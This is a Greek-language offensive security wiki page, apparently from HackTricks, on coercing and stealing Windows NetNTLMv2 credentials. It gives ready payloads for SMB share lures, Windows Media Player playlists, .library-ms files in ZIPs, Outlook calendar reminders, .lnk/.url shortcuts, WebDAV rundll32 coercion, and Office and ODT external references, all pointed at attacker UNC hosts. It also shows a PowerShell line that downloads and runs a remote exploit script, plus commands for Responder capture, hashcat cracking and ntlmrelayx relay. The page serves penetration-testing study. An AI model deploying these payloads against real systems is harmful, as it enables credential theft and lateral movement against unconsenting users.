# Σημεία για υποκλοπή NTLM διαπιστευτηρίων

{{#include ../../banners/hacktricks-training.md}}

**Δείτε όλες τις εξαιρετικές ιδέες από το [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/), από τη λήψη ενός αρχείου Microsoft Word online έως την πηγή διαρροών NTLM: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md και το [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### SMB share με δυνατότητα εγγραφής + UNC lures που ενεργοποιούνται από τον Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Αν μπορείτε να **γράψετε σε ένα share στο οποίο περιηγούνται οι χρήστες ή οι προγραμματισμένες εργασίες μέσω του Explorer**, τοποθετήστε αρχεία των οποίων τα metadata δείχνουν στο UNC σας (π.χ. `\\ATTACKER\share`). Η εμφάνιση του φακέλου ενεργοποιεί **έμμεσο SMB authentication** και διαρρέει ένα **NetNTLMv2** στον listener σας.<sup>[[1]](#references)</sup>

1. **Δημιουργήστε lures** (καλύπτει SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/κ.λπ.)

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **Τοποθετήστε τα στο share με δυνατότητα εγγραφής** (σε οποιονδήποτε φάκελο ανοίγει το θύμα):

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **Ακούστε και κάντε crack**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Τα Windows μπορεί να επεξεργαστούν πολλά αρχεία ταυτόχρονα· για οτιδήποτε εμφανίζει σε προεπισκόπηση ο Explorer (`BROWSE TO FOLDER`) δεν απαιτούνται κλικ.

### Λίστες αναπαραγωγής του Windows Media Player (.ASX/.WAX)

Αν καταφέρετε να κάνετε έναν στόχο να ανοίξει ή να κάνει προεπισκόπηση μιας λίστας αναπαραγωγής του Windows Media Player που ελέγχετε, μπορείτε να προκαλέσετε leak του Net‑NTLMv2, ορίζοντας ως διαδρομή της καταχώρισης μια διαδρομή UNC. Το WMP θα προσπαθήσει να ανακτήσει τα αναφερόμενα πολυμέσα μέσω SMB και θα πραγματοποιήσει έμμεσα authentication.<sup>[[3]](#references)[[4]](#references)</sup>

Παράδειγμα payload:

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

Ροή συλλογής και cracking:

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### Διαρροή NTLM από .library-ms ενσωματωμένο σε ZIP (CVE-2025-24071/24055)

Ο Windows Explorer χειρίζεται με μη ασφαλή τρόπο τα αρχεία .library-ms όταν ανοίγονται απευθείας μέσα από ένα αρχείο ZIP. Αν ο ορισμός της βιβλιοθήκης δείχνει σε απομακρυσμένη διαδρομή UNC (π.χ., \\attacker\share), η απλή περιήγηση ή εκκίνηση του .library-ms μέσα από το ZIP κάνει τον Explorer να απαριθμήσει το UNC και να στείλει έλεγχο ταυτότητας NTLM στον attacker. Έτσι αποκτάται ένα NetNTLMv2, το οποίο μπορεί να αποκρυπτογραφηθεί offline ή ενδεχομένως να γίνει relay.<sup>[[2]](#references)</sup>

Ελάχιστο .library-ms που δείχνει σε UNC του attacker

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Βήματα λειτουργίας
- Δημιουργήστε το αρχείο .library-ms με το παραπάνω XML (ορίστε την IP/hostname σας).
- Συμπιέστε το σε ZIP (στα Windows: Αποστολή προς → Συμπιεσμένος φάκελος (σε μορφή ZIP)) και παραδώστε το στον στόχο.
- Εκτελέστε έναν NTLM capture listener και περιμένετε να ανοίξει το θύμα το .library-ms μέσα από το ZIP.


### Διαδρομή ήχου υπενθύμισης ημερολογίου του Outlook (CVE-2023-23397) – zero-click διαρροή Net-NTLMv2

Το Microsoft Outlook για Windows επεξεργαζόταν την εκτεταμένη ιδιότητα MAPI PidLidReminderFileParameter στα στοιχεία ημερολογίου. Αν αυτή η ιδιότητα έδειχνε σε διαδρομή UNC (π.χ., \\attacker\share\alert.wav), το Outlook επικοινωνούσε με το SMB share όταν ενεργοποιούνταν η υπενθύμιση, προκαλώντας διαρροή του Net-NTLMv2 του χρήστη χωρίς κανένα κλικ. Το πρόβλημα διορθώθηκε στις 14 Μαρτίου 2023, αλλά παραμένει εξαιρετικά σχετικό για παλαιότερα/μη ενημερωμένα συστήματα και για την αναδρομική διερεύνηση περιστατικών.<sup>[[5]](#references)</sup>

Quick exploitation με PowerShell (Outlook COM):

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

Πλευρά του listener:

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

Σημειώσεις
- Το θύμα χρειάζεται μόνο να έχει ανοιχτό το Outlook για Windows όταν ενεργοποιηθεί η υπενθύμιση.
- Το leak αποκαλύπτει Net‑NTLMv2, κατάλληλο για offline cracking ή relay (όχι pass-the-hash).


### leak NTLM μηδενικού κλικ μέσω εικονιδίου .LNK/.URL (CVE‑2025‑50154 – παράκαμψη του CVE‑2025‑24054)

Η Εξερεύνηση των Windows εμφανίζει αυτόματα τα εικονίδια των συντομεύσεων. Πρόσφατη έρευνα έδειξε ότι ακόμη και μετά την ενημέρωση κώδικα της Microsoft τον Απρίλιο του 2025 για συντομεύσεις με εικονίδιο UNC, ήταν ακόμη δυνατό να προκληθεί έλεγχος ταυτότητας NTLM χωρίς κανένα κλικ, φιλοξενώντας τον προορισμό της συντόμευσης σε διαδρομή UNC και διατηρώντας το εικονίδιο τοπικά (η παράκαμψη της ενημέρωσης κώδικα έλαβε το CVE‑2025‑50154). Αρκεί να προβάλει κανείς τον φάκελο για να ανακτήσει η Εξερεύνηση μεταδεδομένα από τον απομακρυσμένο προορισμό, στέλνοντας NTLM στον διακομιστή SMB του attacker.<sup>[[6]](#references)</sup>

Ελάχιστο payload Internet Shortcut (.url):

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

Δημιουργία payload συντόμευσης (.lnk) μέσω PowerShell:

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

Ιδέες παράδοσης
- Τοποθετήστε το shortcut σε ZIP και κάντε το θύμα να το περιηγηθεί.
- Τοποθετήστε το shortcut σε εγγράψιμο share που θα ανοίξει το θύμα.
- Συνδυάστε το με άλλα αρχεία-δολώματα στον ίδιο φάκελο, ώστε ο Explorer να κάνει προεπισκόπηση των στοιχείων.

### No-click .LNK NTLM leak μέσω διαδρομής εικονιδίου ExtraData (CVE‑2026‑25185)

Τα Windows φορτώνουν τα μεταδεδομένα `.lnk` κατά την **προβολή/προεπισκόπηση** (απόδοση εικονιδίων), όχι μόνο κατά την εκτέλεση. Το CVE‑2026‑25185 δείχνει μια διαδρομή ανάλυσης όπου τα μπλοκ **ExtraData** κάνουν το shell να επιλύσει μια διαδρομή εικονιδίου και να προσπελάσει το σύστημα αρχείων **κατά τη φόρτωση**, εκπέμποντας εξερχόμενο NTLM όταν η διαδρομή είναι απομακρυσμένη.

Βασικές συνθήκες ενεργοποίησης (παρατηρήθηκαν στο `CShellLink::_LoadFromStream`):
- Συμπεριλάβετε **DARWIN_PROPS** (`0xa0000006`) στο ExtraData (προϋπόθεση για τη ρουτίνα ενημέρωσης εικονιδίων).
- Συμπεριλάβετε **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) με συμπληρωμένο **TargetUnicode**.
- Ο loader επεκτείνει τις μεταβλητές περιβάλλοντος στο `TargetUnicode` και καλεί το `PathFileExistsW` στη διαδρομή που προκύπτει.

Αν το `TargetUnicode` επιλύεται σε διαδρομή UNC (π.χ., `\\attacker\share\icon.ico`), **και μόνο η προβολή ενός φακέλου** που περιέχει το shortcut προκαλεί εξερχόμενη αυθεντικοποίηση. Η ίδια διαδρομή φόρτωσης μπορεί επίσης να ενεργοποιηθεί από **ευρετηρίαση** και **σάρωση AV**, δημιουργώντας μια πρακτική επιφάνεια leak χωρίς κλικ.<sup>[[7]](#references)</sup>

Εργαλεία έρευνας (parser/generator/UI) είναι διαθέσιμα στο project **LnkMeMaybe** για τη δημιουργία/επιθεώρηση αυτών των δομών χωρίς τη χρήση του γραφικού περιβάλλοντος των Windows.<sup>[[8]](#references)</sup>


### Εξαναγκασμός αυθεντικοποίησης WebDAV / επικύρωση διαπιστευτηρίων μέσω `davclnt.dll,DavSetCookie`

Ο εγγενής **WebDAV client** μπορεί να χρησιμοποιηθεί καταχρηστικά για να εξαναγκάσει την τρέχουσα συνεδρία σύνδεσης να αυθεντικοποιηθεί σε αυθαίρετο endpoint **HTTP/WebDAV**:

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

Γιατί είναι χρήσιμο:
- Σε έναν **WebDAV server που ελέγχει ο επιτιθέμενος**, μπορεί να προκαλέσει **NTLM μέσω HTTP** χωρίς να χρειαστεί να αναπτύξετε προσαρμοσμένο client.
- Σε **εσωτερικούς hosts**, είναι ένας διακριτικός τρόπος να **επαληθεύσετε πού γίνονται δεκτά τα κλεμμένα διαπιστευτήρια** πριν από πλευρική μετακίνηση.<sup>[[9]](#references)</sup>
- Η εντολή αποτελεί καλή εναλλακτική όταν φιλτράρεται η εξερχόμενη κίνηση **SMB**, αλλά η **HTTP/WebDAV** εξακολουθεί να είναι προσβάσιμη.

Λειτουργικές σημειώσεις:
- Η υπηρεσία **WebClient** πρέπει να εκτελείται στον host-πηγή.
- Το `rundll32.exe` φορτώνει το `davclnt.dll` και αναθέτει στα Windows τη διαχείριση του ελέγχου ταυτότητας WebDAV με τα **διαπιστευτήρια του τρέχοντος χρήστη**.<sup>[[10]](#references)</sup>
- Αν το κατευθύνετε σε υποδομή που ελέγχετε, χρησιμοποιήστε έναν HTTP listener/relay που υποστηρίζει NTLM, όπως:

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

Από την οπτική της ανίχνευσης, οι επαναλαμβανόμενες εκτελέσεις του `rundll32.exe davclnt.dll,DavSetCookie` προς πολλά εσωτερικά συστήματα αποτελούν ισχυρή ένδειξη **προετοιμασίας για επικύρωση διαπιστευτηρίων / πλευρική κίνηση τύπου spray**, και όχι φυσιολογικής συμπεριφοράς χρήστη.<sup>[[9]](#references)[[11]](#references)</sup>

### URI απομακρυσμένων ειδοποιήσεων για εξαναγκασμό NTLM μέσω WebDAV

Αν μια εφαρμογή ακολουθεί διευθύνσεις αναδυόμενων παραθύρων ή web-view που έχουν διαμορφωθεί απομακρυσμένα, μια διεύθυνση `file://` μπορεί να εξαναγκάσει εξερχόμενη πιστοποίηση **χωρίς να ανοιχτεί έγγραφο ή να χρησιμοποιηθεί εκτελέσιμο payload**. Στην περίπτωση της AOMEI, μια ειδοποίηση ενός pixel παρέπεμπε σε απομακρυσμένη διαδρομή WebDAV `DavWWWRoot`. Τα Windows επιχείρησαν ενσωματωμένη πιστοποίηση προς αυτή τη διεύθυνση, εκθέτοντας μια απόκριση πρόκλησης NetNTLMv2. Η ενεργοποίηση προήλθε από την αναφορά στο URI, όχι από την ορατότητα του αναδυόμενου παραθύρου· εξακολουθεί να εξαρτάται από τον χειριστή URI της εφαρμογής, τη [συμπεριφορά του Windows WebClient](../../network-services-pentesting/pentesting-web/put-method-webdav.md#client-side-webdav-delivery-and-execution) και την πολιτική εξερχόμενης πιστοποίησης.<sup>[[16]](#references)</sup>

```ini
[PopWindow1]
Address="file://<ATTACKER_IP>/DavWWWRoot/campaign/24hour-flash-sale.html"
Width=1
Height=1
Priority=9999
```

Σε αντίθεση με τον παραπάνω εξαναγκασμό μέσω εντολών, αυτό το σημείο εισόδου απαιτεί έλεγχο μιας [ρύθμισης ειδοποιήσεων λογισμικού](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#notification-configuration-as-a-second-update-trigger). Το παράθυρο ενός pixel και η υψηλή προτεραιότητα δείχνουν ότι ακόμη και μια διακριτική ειδοποίηση μπορεί να κάνει τον client να αποαναφέρει το URI.<sup>[[16]](#references)</sup>

### Εισαγωγή απομακρυσμένου προτύπου Office (.docx/.dotm) για εξαναγκασμό NTLM

Τα έγγραφα Office μπορούν να αναφέρονται σε εξωτερικό πρότυπο. Αν ορίσετε το συνημμένο πρότυπο σε μια διαδρομή UNC, το άνοιγμα του εγγράφου θα κάνει authenticate μέσω SMB.

Ελάχιστες αλλαγές στις σχέσεις DOCX (μέσα στο word/):

1) Επεξεργαστείτε το word/settings.xml και προσθέστε την αναφορά στο συνημμένο πρότυπο:

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) Επεξεργαστείτε το word/_rels/settings.xml.rels και ορίστε το rId1337 να δείχνει στο UNC σας:

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) Επανασυσκευάστε το σε .docx και παραδώστε το. Εκτελέστε τον SMB capture listener σας και περιμένετε να ανοίξει το αρχείο.

### Εξωτερικό αντικείμενο ODT για SMB authentication

Όταν μια διαδρομή μεταφόρτωσης εγγράφων δέχεται `.odt`, αλλά ο στόχος δεν ανοίγει αρχεία Office `.docx`, χρησιμοποιήστε ένα εξωτερικό αντικείμενο OpenDocument αντί για ένα πρότυπο Office. Το Metasploit `auxiliary/fileformat/odt_badodt` δημιουργεί ένα ODT του οποίου το `content.xml` περιέχει μια αναφορά `draw:object` που εκτελείται κατά το άνοιγμα, όπως αυτή που φαίνεται παρακάτω. Ορίστε το `LHOST` στον SMB listener, μεταφορτώστε το ODT μέσω της επιτρεπόμενης ροής εργασιών και καταγράψτε την εξερχόμενη απόκριση NetNTLMv2 όταν ένας χρήστης ή επεξεργαστής εγγράφων το ανοίξει. Ο έλεγχος της επέκτασης του ονόματος αρχείου δεν εξετάζει αυτό το ενσωματωμένο URL· οι περιορισμοί εισερχόμενων συνδέσεων NTLM στον στόχο δεν εμποδίζουν απαραίτητα την εξερχόμενη authentication.<sup>[[15]](#references)</sup>

```xml
<draw:object xlink:href="file://<attacker-ip>/test.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
```

Για ιδέες σχετικά με relay ή κατάχρηση NTLM μετά τη συλλογή διαπιστευτηρίων, δείτε:

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – Δολώματα σε εγγράψιμο share + capture από Responder → crack NetNTLMv2 → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – leak authentication από ZIP .library‑ms (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 για DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — leak NTLM από WMP → junction NTFS προς webroot RCE → FullPowers + GodPotato για SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 ευπάθειες NTLM: Αδιόρθωτες απειλές κλιμάκωσης προνομίων στη Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Η Microsoft μετριάζει το Outlook EoP (CVE‑2023‑23397) και εξηγεί το leak NTLM μέσω PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero‑click, ένα NTLM: Παράκαμψη ενημέρωσης ασφαλείας της Microsoft (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: Ανασκόπηση του CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [Εργαλεία TrustedSec LnkMeMaybe](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – Όταν καλεί η υποστήριξη IT: Ανάλυση μιας καμπάνιας ModeloRAT από το Teams έως την παραβίαση domain](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – Κεφαλίδα davclnt.h](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Αίτημα WebDAV από Windows Rundll32](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Σημεία ενδιαφέροντος για την κλοπή hash Netntlm](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [15] [HTB: Hercules — Capture NTLM μέσω εξωτερικού αντικειμένου ODT](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
- [16] [Google Threat Intelligence Group και Mandiant – Διερεύνηση παροδικής παραποίησης της εφοδιαστικής αλυσίδας](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
